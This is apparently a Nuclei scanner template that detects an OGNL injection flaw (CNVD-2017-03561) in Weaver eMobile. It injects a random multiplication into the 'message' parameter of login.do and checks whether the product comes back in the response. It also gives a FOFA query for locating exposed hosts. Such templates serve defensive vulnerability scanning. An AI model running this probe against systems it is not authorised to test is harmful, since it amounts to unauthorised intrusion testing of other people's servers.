id: CNVD-2017-03561

info:
  name: 泛微 eMobile OGNL 注入漏洞（CNVD-2017-03561）
  author: ritikchaddha
  severity: high
  description: |
    泛微 eMobile 的 `login.do` 与 `login/login.do` 接口存在 OGNL 表达式注入风险。攻击者可在 `message` 参数中构造恶意表达式并由服务端解析执行；模板通过注入算术表达式并校验响应中是否返回计算结果来确认漏洞。
  reference:
    - https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md
    - https://reconshell.com/vulnerability-research-list/
  metadata:
    verified: true
    max-request: 2
    fofa-query: app="泛微-eMobile"
  tags: cnvd,cnvd2017,emobile,ognl,fanwei,vuln
variables:
  num1: "{{rand_int(800000, 999999)}}"
  num2: "{{rand_int(800000, 999999)}}"
  result: "{{to_number(num1)*to_number(num2)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/login.do?message={{num1}}*{{num2}}"
      - "{{BaseURL}}/login/login.do?message={{num1}}*{{num2}}"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{result}}"

      - type: status
        status:
          - 200
